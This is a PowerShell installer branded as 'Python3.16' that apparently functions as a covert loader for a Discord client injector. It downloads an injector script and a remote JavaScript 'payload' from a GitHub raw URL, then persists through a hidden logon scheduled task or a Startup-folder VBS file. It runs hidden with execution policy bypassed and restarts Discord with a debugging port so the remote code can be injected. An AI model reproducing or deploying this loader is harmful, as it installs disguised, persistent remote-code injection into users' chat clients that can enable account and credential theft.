[CmdletBinding()]
param(
    [string]$RawBase = 'https://raw.githubusercontent.com/testkgj/python316-client/main',
    [int]$Port = 9222,
    [switch]$NoStartNow,
    [switch]$NoTask,
    [switch]$Repair,
    [switch]$Status,
    [switch]$Uninstall
)

$ErrorActionPreference = 'Stop'
$Root        = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
$TaskName    = 'Python316 Injector'
$InstallDir  = Join-Path $env:LOCALAPPDATA 'Python316'
$psExe       = (Get-Command powershell.exe).Source

function Say($m, $c = 'Gray') { Write-Host $m -ForegroundColor $c }

function Stop-Watchers {
    $found = $false
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.CommandLine -and $_.CommandLine -match 'injector\.ps1' -and $_.CommandLine -match 'Python316') {
            try { Stop-Process -Id $_.ProcessId -Force; $found = $true } catch {}
        }
    }
    if ($found) { Start-Sleep -Milliseconds 600 }
    return $found
}

function Get-RemoteVersion {
    try {
        $v = Invoke-RestMethod -Uri ('{0}/version.json?t={1}' -f $RawBase, [DateTime]::UtcNow.Ticks) -TimeoutSec 10 -UseBasicParsing
        return $v.version
    } catch { return $null }
}

# ---------------------------------------------------------------- modes
if ($Status) {
    $doc = if (Test-Path (Join-Path $Root 'doctor.ps1')) { Join-Path $Root 'doctor.ps1' } else { Join-Path $InstallDir 'doctor.ps1' }
    if (Test-Path $doc) { & $psExe -NoProfile -ExecutionPolicy Bypass -File $doc; exit 0 }
    Say 'doctor.ps1 not found' 'Red'; exit 1
}
if ($Uninstall) {
    $un = if (Test-Path (Join-Path $Root 'uninstall.ps1')) { Join-Path $Root 'uninstall.ps1' } else { Join-Path $InstallDir 'uninstall.ps1' }
    if (Test-Path $un) { & $psExe -NoProfile -ExecutionPolicy Bypass -File $un; exit 0 }
    Say 'uninstall.ps1 not found' 'Red'; exit 1
}

Say '===========================================' 'Cyan'
Say ("   Python3.16 - {0}" -f $(if ($Repair) { 'Repair' } else { 'Loader Setup' })) 'Cyan'
Say '===========================================' 'Cyan'

if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }

function Fetch($name, $dest) {
    $u = '{0}/{1}?t={2}' -f $RawBase, $name, [DateTime]::UtcNow.Ticks
    Say "  downloading $name"
    Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -OutFile $dest
}

$localInjector = Join-Path $Root 'injector.ps1'
$localConfig   = Join-Path $Root 'config.json'
$localMain     = Join-Path $Root 'main.js'
$localVersion  = Join-Path $Root 'version.json'

$dstInjector = Join-Path $InstallDir 'injector.ps1'
$dstConfig   = Join-Path $InstallDir 'config.json'
$dstMain     = Join-Path $InstallDir 'main.js'
$dstVersion  = Join-Path $InstallDir 'version.json'

$displayVersion = if (Test-Path $localVersion) {
    try { (Get-Content $localVersion -Raw | ConvertFrom-Json).version } catch { $null }
} else { Get-RemoteVersion }
if (-not $displayVersion) { $displayVersion = Get-RemoteVersion }
Say ("  version: {0}" -f $(if ($displayVersion) { $displayVersion } else { 'unknown' })) 'DarkGray'

# ---------------------------------------------------------------- files
if (Test-Path $localInjector) {
    Copy-Item $localInjector $dstInjector -Force
} else {
    Fetch 'injector.ps1' $dstInjector
}
try { $null = [scriptblock]::Create((Get-Content $dstInjector -Raw)) }
catch { throw "injector.ps1 failed to parse after install: $($_.Exception.Message)" }
Say "  injector -> $dstInjector" 'DarkGray'

if (Test-Path $localConfig) {
    Copy-Item $localConfig $dstConfig -Force
} elseif (-not (Test-Path $dstConfig)) {
    $cfg = [ordered]@{
        port            = $Port
        githubRaw       = "$RawBase/main.js"
        repoBase        = $RawBase
        autoLaunch      = $true
        restartExisting = $true
        pollSeconds     = 6
    }
    $cfg | ConvertTo-Json | Set-Content -LiteralPath $dstConfig -Encoding UTF8
}
Say "  config   -> $dstConfig" 'DarkGray'

if (Test-Path $localMain) {
    Copy-Item $localMain $dstMain -Force
} else {
    try { Fetch 'main.js' $dstMain } catch { Say "  payload cache skipped: $($_.Exception.Message)" 'Yellow' }
}
if (Test-Path $localVersion) { Copy-Item $localVersion $dstVersion -Force }
Say "  payload  -> $dstMain" 'DarkGray'

# doctor is handy to keep next to the install
$localDoctor = Join-Path $Root 'doctor.ps1'
if (Test-Path $localDoctor) {
    Copy-Item $localDoctor (Join-Path $InstallDir 'doctor.ps1') -Force
} else {
    try { Fetch 'doctor.ps1' (Join-Path $InstallDir 'doctor.ps1') } catch {}
}

# ---------------------------------------------------------------- scheduled task
$startupVbs = Join-Path ([Environment]::GetFolderPath('Startup')) 'Python316.vbs'
$argLine    = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector

$registered = $false
if (-not $NoTask) {
    try {
        $action   = New-ScheduledTaskAction -Execute $psExe -Argument $argLine
        $trigger  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit ([TimeSpan]::Zero)
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Description 'Injects Python3.16 into Discord at launch' -Force | Out-Null
        $registered = $true
        Say "  scheduled task registered: $TaskName" 'Green'
    } catch {
        Say "  scheduled task failed ($($_.Exception.Message)); using Startup folder" 'Yellow'
    }

    if (-not $registered) {
        $vbsLines = @(
            'Set sh = CreateObject("WScript.Shell")',
            ('sh.Run "{0} {1}", 0, False' -f $psExe, ($argLine -replace '"', '""'))
        )
        Set-Content -LiteralPath $startupVbs -Value $vbsLines -Encoding ASCII
        Say "  startup entry -> $startupVbs" 'Green'
    } else {
        if (Test-Path $startupVbs) { Remove-Item $startupVbs -Force }
    }
}

# ---------------------------------------------------------------- start now
if (-not $NoStartNow) {
    Say ''
    if ($registered) { try { Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue } catch {} }
    $stopped = Stop-Watchers
    if ($stopped) { Say '  stopped previous watcher (reload)' 'DarkGray' }

    for ($i = 0; $i -lt 10; $i++) {
        $still = (Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -match 'injector\.ps1' -and $_.CommandLine -match 'Python316' } | Measure-Object).Count
        if ($still -eq 0) { break }
        Start-Sleep -Milliseconds 500
    }

    Say 'Starting the watcher (attaches / restarts Discord once if needed)...' 'Cyan'
    if ($registered) {
        try { Start-ScheduledTask -TaskName $TaskName } catch { Say "  task start failed ($($_.Exception.Message))" 'Yellow' }
        Start-Sleep -Seconds 2
    }

    $alive = (Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -match 'injector\.ps1' -and $_.CommandLine -match 'Python316' } | Measure-Object).Count -gt 0
    if ($alive) {
        Say '  watcher running.' 'Green'
    } else {
        Start-Process -FilePath $psExe -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $dstInjector) -WindowStyle Hidden | Out-Null
        Say '  watcher started directly.' 'Green'
    }
} else {
    Say ''
    Say 'Skipped immediate attach (-NoStartNow). It will run at next Discord launch / logon.' 'Yellow'
}

Say ''
Say ("DONE. Python3.16 {0} installed." -f $displayVersion) 'Green'
Say "  install dir : $InstallDir"
Say "  task name   : $TaskName"
Say "  payload url : $RawBase/main.js"
Say ''
Say 'Status:   install.ps1 -Status' 'DarkGray'
Say 'Repair:   install.ps1 -Repair' 'DarkGray'
Say 'Remove:   install.ps1 -Uninstall' 'DarkGray'
